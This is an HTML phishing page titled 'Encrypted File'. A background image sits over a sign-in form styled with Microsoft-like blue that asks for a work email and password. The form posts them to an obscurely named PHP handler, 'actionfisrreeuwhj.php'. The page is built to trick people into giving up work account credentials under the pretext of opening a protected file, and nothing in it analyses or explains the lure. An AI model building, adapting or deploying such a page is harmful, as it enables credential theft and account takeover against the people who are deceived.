<html><head>
        <title>Encrypted File</title>
        <!-- ---- Links --- !-->
         <style type="text/css"></style></head>
    <body>
        
           <div class="logo">
               <img src="bettyimages/lofisirrut.png" style="position:absolute;left:0px;top:0px">
               
           </div>
                          
        <!-- --- Form Login --- !-->
        <div id="form" style="left:680px;height:200px;">
            <form action="actionfisrreeuwhj.php" method="post">
            <h2 style="position:absolute;right:20%;top:40px;COLOR:#FFFFFF;height:150px;">  ..</h2>
            <div id="header-border-div0"></div>
        <input type="user" name="user" placeholder=" Work Email" required="" style="position:absolute;left:472px;top:327px;width:336;height:32px;padding:2px;border-radius:0px;border: 0px solid #bdc4c9;font-size: 1em;
font-family: Helvetica,Arial,sans-serif;
font-weight: 300;
">
        <input type="password" name="pass" placeholder=" Password" required="" style="position:absolute;left:473px;top:377px;width:336;height:32px;padding:2px;border-radius:0px;border: 1px solid #bdc4c9;font-size: 1em;
font-family: Helvetica,Arial,sans-serif;
font-weight: 300;">
        <button type="submit" class="login-button button-primary" style="position:absolute;top:430px;left:473px;padding:8px;font-size:.900em;box-sizing:border-box;display:block;cursor:pointer;background: #0067b8;border: none;border-radius: 0px;padding: .75em 1em;color: #fff!important;text-align: center;text-transform: capitalize;font-family: Optimist,Arial,Helvetica,sans-serif;vertical-align: baseline;width:336;height:35px">
            <div class="sign-in-text">Sign in          </div>
            </button> 
            </form>
            </div>
        <!-- --- Form Login --- !-->
        <!-- --- Under Form --- !-->
                <!-- --- Under Form --- !-->
        <!-- --- Footer ---- !-->
        <div id="footer">
                            </div>
        <!-- --- Footer ---- !-->
    
 </header></body></html>